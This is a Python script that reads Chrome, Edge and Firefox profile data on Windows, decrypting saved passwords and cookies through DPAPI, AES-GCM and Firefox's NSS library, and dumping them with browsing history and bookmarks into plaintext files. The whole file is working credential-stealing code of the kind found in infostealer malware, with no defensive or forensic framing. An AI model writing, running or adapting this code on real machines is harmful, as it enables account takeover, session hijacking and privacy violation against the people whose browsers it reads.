import os
import json
import base64
import sqlite3
import shutil
from datetime import datetime, timedelta, timezone
import win32crypt  # Install with: pip install pypiwin32
from Crypto.Cipher import AES, DES3   # Install with: pip install pycryptodome
import ctypes as ct
from base64 import b64decode
import csv
from configparser import ConfigParser

## CHROME FUNCTIONS ##
def get_chrome_datetime(chromedate):
    if chromedate != 86400000000 and chromedate:
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
        except Exception as e:
            print(f"Error: {e}, chromedate: {chromedate}")
            return chromedate
    else:
        return ""

def get_chrome_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="UTF-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_data(data, key):
    try:
        iv = data[3:15]
        data = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except:
            return ""

#Cookies
def extract_chrome_cookies(output_file):
    try:
        # Path to the local Chrome cookies database
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData",
                               "Local", "Google", "Chrome", "User Data", "Default",
                               "Network", "Cookies")

        # Connect to the database
        db = sqlite3.connect(db_path)
        # Ignore decoding errors
        db.text_factory = lambda b: b.decode(errors="ignore")
        cursor = db.cursor()

        # Retrieve cookies from the `Cookies` table
        cursor.execute("""
        SELECT host_key, name, value, creation_utc, last_access_utc,
        expires_utc, encrypted_value
        FROM Cookies""")

        # Get the AES key
        key = get_chrome_encryption_key()
        with open(output_file, "w", encoding="utf-8") as cookies_file:
            for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
                if not value:
                    decrypted_value = decrypt_data(encrypted_value, key)
                else:
                    # Already decrypted
                    decrypted_value = value
                cookies_file.write(f"Host : {host_key}\n")
                cookies_file.write(f"Cookie Name : {name}\n")
                cookies_file.write(f"Cookie Value(decrypted) : {decrypted_value}\n")
                cookies_file.write(f"Creation Datetime(UTC): {get_chrome_datetime(creation_utc)}\n")
                cookies_file.write(f"Last Access Datetime(UTC) : {get_chrome_datetime(last_access_utc)}\n")
                cookies_file.write(f"Expires Datetime (UTC) : {get_chrome_datetime(expires_utc)}\n")
                cookies_file.write("========================================================================================\n")

    except PermissionError as e:
        print(f"PermissionError: {e}")
    finally:
        # Close the connection
        db.close()

#History
def extract_chrome_history(output_file):
    try:
        # Path to the local Chrome history database
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData",
                               "Local", "Google", "Chrome", "User Data", "Default",
                               "History")

        # Connect to the history database
        db = sqlite3.connect(db_path)
        cursor = db.cursor()

        # Retrieve browsing history from the `urls` table
        cursor.execute("""
        SELECT datetime(last_visit_time/1000000-11644473600,'unixepoch') AS last_visited,
        title, url FROM urls""")

        with open(output_file, "w", encoding="utf-8") as history_file:
            for row in cursor.fetchall():
                last_visited, title, url = row
                history_file.write(f"Last Visited : {last_visited}\n")
                history_file.write(f"Title : {title}\n")
                history_file.write(f"URL : {url}\n")
                history_file.write("========================================================================================\n")

    except PermissionError as e:
        print(f"PermissionError: {e}")
    except Exception as e:
        print(f"Error extracting history: {e}")
    finally:
        # Close the connection
        db.close()

#Bookmarks
def extract_chrome_bookmarks(output_file):
    chrome_data_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default")
    bookmarks_path = os.path.join(chrome_data_path, 'Bookmarks')

    # Check if the bookmarks file exists
    if not os.path.exists(bookmarks_path):
        print(f"No bookmarks file found at {bookmarks_path}")
        return

    try:
        with open(bookmarks_path, 'r', encoding='utf-8') as file:
            bookmarks_data = json.load(file)

        with open(output_file, 'w', encoding='utf-8') as file:
            def traverse_bookmarks(node):
                if 'type' in node and node['type'] == 'url':
                    file.write(f"{node['name']} | {node['url']}\n")
                elif 'children' in node:
                    for child in node['children']:
                        traverse_bookmarks(child)

            # Traverse root nodes
            for root_node in bookmarks_data['roots']:
                traverse_bookmarks(bookmarks_data['roots'][root_node])

    except Exception as e:
        print(f"Error extracting bookmarks: {str(e)}")

#Passwords
def extract_chrome_passwords(output_file):
    try:
        # Get the AES key
        key = get_chrome_encryption_key()
        # Path to the local Chrome passwords database
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                               "Google", "Chrome", "User Data", "default", "Login Data")
        # Copy the file to another location as the database will be locked if Chrome is running
        filename = "ChromeData.db"
        shutil.copyfile(db_path, filename)
        # Connect to the database
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        # Table `logins` contains the required data
        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        with open(output_file, "w", encoding="utf-8") as passwords_file:
            for row in cursor.fetchall():
                origin_url = row[0]
                action_url = row[1]
                username = row[2]
                password = decrypt_data(row[3], key)
                date_created = row[4]
                date_last_used = row[5]
                if username or password:
                    passwords_file.write(f"URL: {origin_url}\n")
                    passwords_file.write(f"Username: {username}\n")
                    passwords_file.write(f"Password: {password}\n")
                else:
                    continue
                if date_created != 86400000000 and date_created:
                    passwords_file.write(f"Creation Date: {str(get_chrome_datetime(date_created))}\n")
                if date_last_used != 86400000000 and date_last_used:    
                    passwords_file.write("========================================================================================\n")
        cursor.close()
        db.close()
        try:
            # Try to delete the copied database file
            os.remove(filename)
        except:
            pass

    except PermissionError as e:
        print(f"PermissionError: {e}")

## EDGE
# Function to get the Edge browser's datetime from a given 'edgedate'.
def get_edge_datetime(edgedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=edgedate)

#Bookmarks
def extract_edge_bookmarks(output_file):
    edge_data_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default")
    bookmarks_path = os.path.join(edge_data_path, 'Bookmarks')

    if not os.path.exists(bookmarks_path):
        print(f"No bookmarks file found at {bookmarks_path}")
        return

    try:
        with open(bookmarks_path, 'r', encoding='utf-8') as file:
            bookmarks_data = json.load(file)

        with open(output_file, 'w', encoding='utf-8') as file:
            def traverse_bookmarks(node):
                if 'type' in node and node['type'] == 'url':
                    file.write(f"{node['name']} | {node['url']}\n")
                elif 'children' in node:
                    for child in node['children']:
                        traverse_bookmarks(child)

            for root_node in bookmarks_data['roots']:
                traverse_bookmarks(bookmarks_data['roots'][root_node])

    except Exception as e:
        print(f"Error extracting Edge bookmarks: {e}")

#History
def extract_edge_history(output_file):
    try:
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                               "Microsoft", "Edge", "User Data", "Default", "History")

        db = sqlite3.connect(db_path)
        cursor = db.cursor()

        cursor.execute("""
        SELECT datetime(last_visit_time/1000000-11644473600,'unixepoch') AS last_visited,
        title, url FROM urls""")

        with open(output_file, "w", encoding="utf-8") as history_file:
            for row in cursor.fetchall():
                last_visited, title, url = row
                history_file.write(f"Last Visited: {last_visited}\n")
                history_file.write(f"Title: {title}\n")
                history_file.write(f"URL: {url}\n")
                history_file.write("========================================================================================\n")

    except PermissionError as e:
        print(f"PermissionError: {e}")
    except Exception as e:
        print(f"Error extracting Edge history: {e}")
    finally:
        db.close()

#Cookies
def extract_edge_cookies(output_file):
    db = None
    try:
        # Original path to the Edge cookies database
        original_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                        "Microsoft", "Edge", "User Data", "Default",
                                        "Network", "Cookies")

        # Ensure the original database file exists
        if not os.path.isfile(original_db_path):
            raise FileNotFoundError(f"Edge cookies database not found at {original_db_path}")

        # Path for the temporary copy of the database
        temp_db_path = os.path.join(os.path.dirname(__file__), "temp_EdgeCookies.db")

        # Copy the database file to the temporary location
        shutil.copyfile(original_db_path, temp_db_path)

        # Connect to the copied database
        db = sqlite3.connect(temp_db_path)
        cursor = db.cursor()

        # Retrieve cookies from the `Cookies` table
        cursor.execute("SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value FROM Cookies")

        # Get the AES key for Edge
        key = get_edge_encryption_key()

        # Write the cookies to the output file
        with open(output_file, "w", encoding="utf-8") as cookies_file:
            for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
                decrypted_value = value if value else edge_decrypted_password(encrypted_value, key)
                cookies_file.write(f"Host: {host_key}\n")
                cookies_file.write(f"Cookie Name: {name}\n")
                cookies_file.write(f"Cookie Value (decrypted): {decrypted_value}\n")
                cookies_file.write(f"Creation Datetime (UTC): {get_edge_datetime(creation_utc)}\n")
                cookies_file.write(f"Last Access Datetime (UTC): {get_edge_datetime(last_access_utc)}\n")
                cookies_file.write(f"Expires Datetime (UTC): {get_edge_datetime(expires_utc)}\n")
                cookies_file.write("========================================================================================\n")

    except FileNotFoundError as e:
        print(f"File not found error: {e}")
    except Exception as e:
        print(f"Error extracting Edge cookies: {e}")
    finally:
        # Close the database connection and remove the temporary file
        if db:
            db.close()
        try:
            os.remove(temp_db_path)
        except Exception as e:
            print(f"Error cleaning up temporary files: {e}")


# Define the decrypted_password function for Edge
def get_edge_encryption_key():
    # Construct the path to the "Local State" file in Edge's user data.
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                    "Microsoft", "Edge", "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # Decode the encryption key from base64.
    key = base64.b64decode(local_state['os_crypt']["encrypted_key"])
    # Remove DPAPI prefix.
    key = key[5:]
    # Return the decrypted key, originally encrypted using the user's current login credentials.
    # Documentation: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def edge_decrypted_password(password, key):
    try:
        # Get the initialization vector (IV).
        iv = password[3:15]
        password = password[15:]
        # Generate a cipher.
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # Decrypt the password.
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # Not supported.
            return ""

        
# Function to extract Edge passwords
def extract_edge_passwords(output_file):
    try:
        # Get the AES key
        key = get_edge_encryption_key()
        # Path to the local Edge passwords database
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                               "Microsoft", "Edge", "User Data", "Default", "Login Data")
        # Copy the file to another location as the database will be locked if Edge is running
        filename = "EdgePasswordsData.db"
        shutil.copyfile(db_path, filename)
        # Connect to the database
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        # Table `logins` contains the required data
        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        with open(output_file, "w", encoding="utf-8") as passwords_file:
            for row in cursor.fetchall():
                origin_url = row[0]
                action_url = row[1]
                username = row[2]
                password = edge_decrypted_password(row[3], key)
                date_created = row[4]
                date_last_used = row[5]
                if username or password:
                    passwords_file.write(f"URL: {origin_url}\n")
                    passwords_file.write(f"Username: {username}\n")
                    passwords_file.write(f"Password: {password}\n")
                else:
                    continue
                if date_created != 86400000000 and date_created:
                    passwords_file.write(f"Creation Date: {str(get_edge_datetime(date_created))}\n")
                passwords_file.write("========================================================================================\n")
        cursor.close()
        db.close()
        try:
            # Try to delete the copied database file
            os.remove(filename)
        except:
            pass

    except PermissionError as e:
        print(f"PermissionError: {e}") 

## FIREFOX
def get_firefox_datetime(firefoxdate):
    return datetime(1970, 1, 1) + timedelta(microseconds=firefoxdate)

#History
def extract_firefox_history(output_file):
    firefox_profile_path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")
    for profile in os.listdir(firefox_profile_path):
        if profile.endswith('.default-release'):
            db_path = os.path.join(firefox_profile_path, profile, "places.sqlite")
            break

    # Ensure the database file exists
    if not os.path.isfile(db_path):
        print("Firefox history database does not exist.")
        return

    # Copy the database file to a temporary location
    temp_db_path = os.path.join(os.path.dirname(__file__), "temp_FirefoxHistory.db")
    shutil.copyfile(db_path, temp_db_path)

    try:
        db = sqlite3.connect(temp_db_path)
        cursor = db.cursor()
        query = "SELECT url, title, visit_date FROM moz_places, moz_historyvisits WHERE moz_places.id = moz_historyvisits.place_id"
        cursor.execute(query)

        with open(output_file, "w", encoding="utf-8") as history_file:
            for url, title, visit_date in cursor.fetchall():
                history_file.write(f"URL: {url}\n")
                history_file.write(f"Title: {title}\n")
                history_file.write(f"Visit Date: {datetime.fromtimestamp(visit_date/1000000)}\n")
                history_file.write("=" * 50 + "\n\n")

    except Exception as e:
        print(f"Error extracting Firefox history: {e}")
    finally:
        db.close()
        try:
            os.remove(temp_db_path)
        except Exception as e:
            print(f"Error cleaning up temporary files: {e}")

def extract_firefox_bookmarks(output_file):
    firefox_profile_path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")
    for profile in os.listdir(firefox_profile_path):
        if profile.endswith('.default-release'):
            db_path = os.path.join(firefox_profile_path, profile, "places.sqlite")
            break

    # Ensure the database file exists
    if not os.path.isfile(db_path):
        print("Firefox bookmarks database does not exist.")
        return

    # Copy the database file to a temporary location
    temp_db_path = os.path.join(os.path.dirname(__file__), "temp_FirefoxBookmarks.db")
    shutil.copyfile(db_path, temp_db_path)

    try:
        db = sqlite3.connect(temp_db_path)
        cursor = db.cursor()
        query = "SELECT moz_bookmarks.title, moz_places.url FROM moz_bookmarks JOIN moz_places ON moz_bookmarks.fk = moz_places.id WHERE moz_bookmarks.type = 1"
        cursor.execute(query)

        with open(output_file, "w", encoding="utf-8") as bookmarks_file:
            for title, url in cursor.fetchall():
                bookmarks_file.write(f"Title: {title}\n")
                bookmarks_file.write(f"URL: {url}\n")
                bookmarks_file.write("=" * 50 + "\n\n")

    except Exception as e:
        print(f"Error extracting Firefox bookmarks: {e}")
    finally:
        db.close()
        try:
            os.remove(temp_db_path)
        except Exception as e:
            print(f"Error cleaning up temporary files: {e}")


#COOKIES
def extract_firefox_cookies(output_file):
    firefox_profile_path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")
    for profile in os.listdir(firefox_profile_path):
        if profile.endswith('.default-release'):
            cookies_db_path = os.path.join(firefox_profile_path, profile, "cookies.sqlite")
            break

    # Ensure the cookies database file exists
    if not os.path.isfile(cookies_db_path):
        print("Firefox cookies database does not exist.")
        return

    # Copy the database file to a temporary location
    temp_db_path = os.path.join(os.path.dirname(__file__), "temp_FirefoxCookies.db")
    shutil.copyfile(cookies_db_path, temp_db_path)

    try:
        db = sqlite3.connect(temp_db_path)
        cursor = db.cursor()
        cursor.execute("SELECT name, value, host, path, expiry FROM moz_cookies")

        with open(output_file, "w", encoding="utf-8") as cookies_file:
            for name, value, host, path, expiry in cursor.fetchall():
                cookies_file.write(f"Cookie Name: {name}\n")
                cookies_file.write(f"Cookie Value: {value}\n")
                cookies_file.write(f"Domain: {host}\n")
                cookies_file.write(f"Path: {path}\n")
                cookies_file.write(f"Expires Datetime (UTC): {get_firefox_datetime(expiry)}\n")
                cookies_file.write("========================================================================================\n")

    except Exception as e:
        print(f"Error extracting Firefox cookies: {e}")
    finally:
        db.close()
        try:
            os.remove(temp_db_path)
        except Exception as e:
            print(f"Error cleaning up temporary files: {e}")

#PASSWORDS
FIREFOX_PATH = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox")

# Define the SECItem structure
class SECItem(ct.Structure):
    _fields_ = [
        ("type", ct.c_int),
        ("data", ct.c_char_p),
        ("len", ct.c_int),
    ]
    def decode_data(self):
        _bytes = ct.string_at(self.data, self.len)
        return _bytes.decode('utf-8')

def getAllProfiles(profile_path: str) -> list:
    ini = os.path.join(profile_path, "profiles.ini")
    if not os.path.isfile(ini):
        raise Exception(f'profile.ini not found in path {profile_path}.')

    profiles = ConfigParser()
    profiles.read(ini, encoding='utf-8')
    sections = {}
    for section in profiles.sections():
        if section.startswith("Profile"):
            sections[profiles.get(section, "Path")] = None

    return [os.path.join(profile_path, section, 'logins.json') for section in sections]

def locateAndLoadNss() -> ct.CDLL:
    nnsName = 'nss3.dll'
    locations: list[str] = [
        "",  # Current directory or system lib finder
        os.path.expanduser("~\\AppData\\Local\\Mozilla Firefox"),
        "C:\\Program Files\\Mozilla Firefox",
        "C:\\Program Files (x86)\\Mozilla Firefox",
        # Add other locations where nss3.dll might exist
    ]

    for loc in locations:
        nsslib = os.path.join(loc, nnsName)
        try:
            nss: ct.CDLL = ct.CDLL(nsslib)
            return nss
        except OSError:
            continue

    raise FileNotFoundError("Could not find or load 'nss3.dll'.")

def firefox_decrypt(profile: str, data, nss):
    PK11_ReadRawAttribute = nss.PK11_ReadRawAttribute
    PK11_ReadRawAttribute.argtypes = [ct.c_char_p, ct.c_char_p, ct.POINTER(SECItem)]
    PK11_ReadRawAttribute.restype = ct.c_int

    PK11SDR_Decrypt = nss.PK11SDR_Decrypt
    PK11SDR_Decrypt.argtypes = [ct.POINTER(SECItem), ct.POINTER(SECItem), ct.c_void_p]
    PK11SDR_Decrypt.restype = ct.c_int

    profile_path = b"sql:" + bytes(profile.strip('logins.json'), 'utf-8')
    if nss.NSS_Init(profile_path) != 0:
        raise Exception("NSS Library initialization failed!")

    data = b64decode(data)
    inp = SECItem(0, data, len(data))
    out = SECItem(0, None, 0)
    if PK11SDR_Decrypt(inp, out, None) == 0:
        return out.decode_data()
    else:
        return 'Cannot be decrypted'

def extract_and_format_firefox_passwords(output_file):
    try:
        nss = locateAndLoadNss()
    except FileNotFoundError as e:
        print(e)
        return

    with open(output_file, mode='w', encoding='utf-8') as passwords_file:
        for profile in getAllProfiles(FIREFOX_PATH):
            if not os.path.isfile(profile):
                #print(f"Profile not found: {profile}")#
                continue

            try:
                with open(profile) as f:
                    data = json.load(f)

                logins = data.get("logins", [])
                for login in logins:
                    decryptedUsername = firefox_decrypt(profile, login['encryptedUsername'], nss)
                    decryptedPassword = firefox_decrypt(profile, login['encryptedPassword'], nss)
                    passwords_file.write(f"URL: {login['hostname']}\n")
                    passwords_file.write(f"Username: {decryptedUsername}\n")
                    passwords_file.write(f"Password: {decryptedPassword}\n")
                    passwords_file.write("="*80 + "\n\n")

            except Exception as e:
                print(f"Error processing profile {profile}: {e}")

def main():
    # Create the "Browsers" directory if it doesn't exist
    browsers_dir = "Browsers"
    if not os.path.exists(browsers_dir):
        os.makedirs(browsers_dir)

    # Specify the full paths for the output files
    chrome_cookies_output_file = os.path.join(browsers_dir, "Chrome_cookies.txt")
    chrome_history_output_file = os.path.join(browsers_dir, "Chrome_history.txt")
    chrome_bookmarks_output_file = os.path.join(browsers_dir, "Chrome_bookmarks.txt")
    chrome_passwords_output_file = os.path.join(browsers_dir, "Chrome_passwords.txt")
    
    edge_passwords_output_file = os.path.join(browsers_dir, "Edge_passwords.txt")
    edge_bookmarks_output_file = os.path.join(browsers_dir, "Edge_bookmarks.txt")
    edge_history_output_file = os.path.join(browsers_dir, "Edge_history.txt")
    edge_cookies_output_file = os.path.join(browsers_dir, "Edge_cookies.txt")

    firefox_history_output_file = os.path.join("Browsers", "Firefox_history.txt")
    firefox_bookmarks_output_file = os.path.join("Browsers", "Firefox_bookmarks.txt")
    firefox_cookies_output_file = os.path.join("Browsers", "Firefox_cookies.txt")
    firefox_passwords_output_file = os.path.join(browsers_dir, "Firefox_passwords.txt")

    extract_chrome_cookies(chrome_cookies_output_file)
    extract_chrome_history(chrome_history_output_file)
    extract_chrome_bookmarks(chrome_bookmarks_output_file)
    extract_chrome_passwords(chrome_passwords_output_file)
    
    extract_edge_passwords(edge_passwords_output_file)
    extract_edge_bookmarks(edge_bookmarks_output_file)
    extract_edge_history(edge_history_output_file)
    extract_edge_cookies(edge_cookies_output_file)

    extract_firefox_history(firefox_history_output_file)
    extract_firefox_bookmarks(firefox_bookmarks_output_file)
    extract_firefox_cookies(firefox_cookies_output_file)
    extract_and_format_firefox_passwords(firefox_passwords_output_file)

if __name__ == "__main__":
    main()
